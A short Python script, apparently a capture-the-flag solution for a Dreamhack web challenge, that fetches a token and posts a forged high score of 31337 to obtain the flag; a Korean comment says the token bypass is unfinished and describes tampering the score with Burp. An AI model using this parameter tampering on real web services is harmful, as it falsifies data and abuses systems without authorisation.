import requests

URL = "http://host3.dreamhack.games:17914"
GET_TOKEN_URI = "/token.php"
HIGH_SCORES_URI = "/high-scores.php"
PAYLOAD = {"token": "", "score": "31337"}
COOKIE = {"PHPSESSID": "2724bd73vs256djeg62aem12q7"}

for i in range(4):
    resp = requests.get(URL + GET_TOKEN_URI)

PAYLOAD["token"] = resp.text

resp = requests.post(URL + HIGH_SCORES_URI, data = PAYLOAD)

print(resp.text)

'''
TOKEN 우회 로직은 아직 만들지 못함.
BURP 이용해서 게임 종료 직후 score를 31337로 변조해서 처리하면 FLAG 출력됨.
'''